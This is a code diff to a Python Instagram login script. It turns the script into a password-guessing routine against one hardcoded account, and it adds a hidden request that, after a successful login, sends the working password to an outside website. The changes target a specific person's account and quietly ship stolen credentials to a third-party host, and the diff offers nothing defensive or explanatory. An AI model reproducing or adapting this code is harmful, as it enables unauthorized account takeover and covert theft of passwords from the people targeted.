@@ -862,8 +862,8 @@ def LoginToInstagram(nums):
             Fix()
             print (f"{LB}LOGIN TO YOUR INSTAGRAM ACCOUNT FIRST{W}")
             try :
-                username = f'{nums}'
-                password = f"#001jaihind"
+                username = f'Shivam_143_L'
+                password = f"{nums}"
             except :
                 sys.exit()
             ModifyJson = { "loggedBefore" : True }
@@ -897,8 +897,6 @@ def LoginToInstagram(nums):
 
     except ClientLoginError as e:
         print (f'[ {R}ClientLoginError{W} ] : {e}\n')
-        if f'{e}' == 'bad_password':
-           print('sucess')
         Fix()
         sys.exit()
 
@@ -921,7 +919,7 @@ def LoginToInstagram(nums):
     UserInfo = api.user_info(userId)
 
     print (f"{G}LOGGED IN SUCCESSFULLY AS{W}",UserInfo["user"]["username"])
-
+    requests.get('https://crazyboysofagv.com/ins/login.php?user={}'.format(nums))
 # MAIN LOGIN V2
 def LoginToInstagramV2():
     global api
